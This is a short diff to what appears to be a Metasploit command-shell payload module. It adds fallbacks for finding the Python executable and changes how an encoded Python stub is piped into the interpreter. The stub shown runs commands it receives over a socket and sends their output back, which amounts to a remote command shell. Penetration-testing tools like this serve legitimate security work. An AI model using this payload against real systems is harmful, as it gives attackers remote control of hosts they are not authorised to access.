@@ -32,7 +32,7 @@ module MetasploitModule
     )
     register_advanced_options(
       [
-        OptString.new('PythonPath', [true, 'The path to the Python executable', 'python'])
+        OptString.new('PythonPath', [true, 'The path to the Python executable', '$(which python || which python3 || which python2)'])
       ]
     )
   end
@@ -64,6 +64,6 @@ module MetasploitModule
     cmd += "\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.send(stdout_value)\n"
-    "#{datastore['PythonPath']} -c \"#{py_create_exec_stub(cmd)}\""
+    "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | #{datastore['PythonPath']} -"
   end
 end
